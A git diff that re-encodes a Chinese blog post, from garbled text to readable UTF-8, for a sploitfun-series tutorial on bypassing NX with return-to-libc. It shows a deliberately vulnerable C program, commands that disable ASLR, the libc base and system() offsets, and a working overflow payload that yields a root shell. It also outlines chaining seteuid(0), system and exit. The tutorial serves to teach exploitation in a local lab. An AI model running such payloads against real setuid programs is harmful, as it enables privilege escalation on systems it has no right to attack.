@@ -1,16 +1,16 @@
 ---
 layout: post
-title: ͨ��return-to-libc�ƹ�NX
-excerpt: "sploitfunϵ�н̳�֮2.1 return-to-libc"
-categories: [sploitfunϵ�н̳�]
+title: 通过return-to-libc绕过NX
+excerpt: "sploitfun系列教程之2.1 return-to-libc"
+categories: [sploitfun系列教程]
 comments: true
 ---
 
 
-#### ʲô��NX����
-NX:No Execute,���������������ζ�ű�����ջ����������û��ִ��Ȩ�޶��Ҵ���ռ�û��д���Ȩ��
+#### 什么是NX防护
+NX:No Execute,这个防护开启就意味着变量、栈、堆中数据没有执行权限而且代码空间没有写入的权限
 
-©������
+漏洞代码
 ```c
  //vuln.c
 #include <stdio.h>
@@ -24,13 +24,13 @@ int main(int argc, char* argv[]) {
  return 0;
 }
 ```
-����
+编译
 ```shell
 echo 0 > /proc/sys/kernel/randomize_va_space
 gcc -g -fno-stack-protector -o vuln vuln.c -m32
 chmod 777 vuln
 ```
-����`readelf -l vuln`�鿴ջ�ռ��Ȩ��
+运行`readelf -l vuln`查看栈空间的权限
 ```
 ...
 ...
@@ -48,10 +48,10 @@ chmod 777 vuln
 ...
 ...
 ```
-��ʱ`GNU_STACK`�Ѿ�û����E��־λ(ִ��Ȩ��)
+此时`GNU_STACK`已经没有了E标志位(执行权限)
 
-#### exp��д����
-ͨ��`more /proc/19669/maps`�鿴libc�Ļ���ַ
+#### exp编写过程
+通过`more /proc/19669/maps`查看libc的基地址
 ```
 08048000-08049000 r-xp 00000000 fd:00 69981924                           /root/sploitfun/vuln
 08049000-0804a000 r--p 00000000 fd:00 69981924                           /root/sploitfun/vuln
@@ -69,9 +69,9 @@ f7ffc000-f7ffd000 r--p 00021000 fd:00 34036408                           /usr/li
 f7ffd000-f7ffe000 rw-p 00022000 fd:00 34036408                           /usr/lib/ld-2.17.so
 fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
 ```
-�õ�libc����ַλ`f7e02000`
+得到libc基地址位`f7e02000`
 
-ͨ��`readelf -s /usr/lib/libc-2.17.so | grep system`�鿴system��offset
+通过`readelf -s /usr/lib/libc-2.17.so | grep system`查看system的offset
 ```shell
    246: 00132650    73 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
    627: 0003ef70    98 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
@@ -83,15 +83,15 @@ fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
   7618: 00132650    73 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr
   7683: 0003ef70    98 FUNC    GLOBAL DEFAULT   13 __libc_system
 ```
-ͨ��`objdump -s /usr/lib/libc-2.17.so |less`����sh�ַ�������00��β
+通过`objdump -s /usr/lib/libc-2.17.so |less`查找sh字符并且以00结尾
 ```
  0e5b8 5f6d6f64 64693300 696e6574 365f6f70  _moddi3.inet6_op
  0e5c8 745f6669 6e697368 005f494f 5f646566  t_finish._IO_def
  0e5d8 61756c74 5f787370 75746e00 5f5f7763  ault_xsputn.__wc
 ```
-�õ�sh.λ��offsetΪ0e5ce,��sh.λ�õľ���λ��Ϊ`0xf7Ee05ce`
+得到sh.位置offset为0e5ce,固sh.位置的绝对位置为`0xf7Ee05ce`
 
-������Ҫ��ջ�ռ�������¹���
+我们需要在栈空间进行如下构建
 ```
  ______
 | AAAA |
@@ -109,15 +109,15 @@ fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
 ```
 
 
-���Ľ��
+最后的结果
 ```bash
 ./vuln `python -c 'print "A"*268 + "\x70\x0f\xe4\xf7"+"\xff\xff\xff\xff"+"\xce\x05\xe1\xf7"'`
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp��????��
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp澉????吾
 sh-4.2# exit
 exit
 ```
-#### һ������
-�����������СȨ��ԭ���û���ȡ����֮ǰɾ��rootȨ�ޡ���ˣ���ʹ�û������Ƕ���ģ�������Ҳ����õ�root shell����������
+#### 一点疑问
+若程序采用最小权限原则，用户获取输入之前删除root权限。因此，即使用户输入是恶意的，攻击者也不会得到root shell。代码如下
 ```c
 //vuln_priv.c
 #include <stdio.h>
@@ -132,10 +132,10 @@ int main(int argc, char* argv[]) {
  return 0;
 }
 ```
-��ô����ڳ���ʹ������СȨ��ԭ��������£���ȡrootȨ���أ�������ǵ�ջ�ռ��������죬��ôpwn֮��Ϳ��Ի�ȡrootȨ��
+那么如何在程序使用了最小权限原则的限制下，获取root权限呢？如果我们的栈空间这样构造，那么pwn之后就可以获取root权限
 
 - seteuid(0)
-- system(��sh��)
+- system(“sh”)
 - exit()
 
-�������ǾͿ��Ի��rootȨ�ޣ����ּ�������chaining of return-to-libc
+这样我们就可以获得root权限，这种技术叫做chaining of return-to-libc
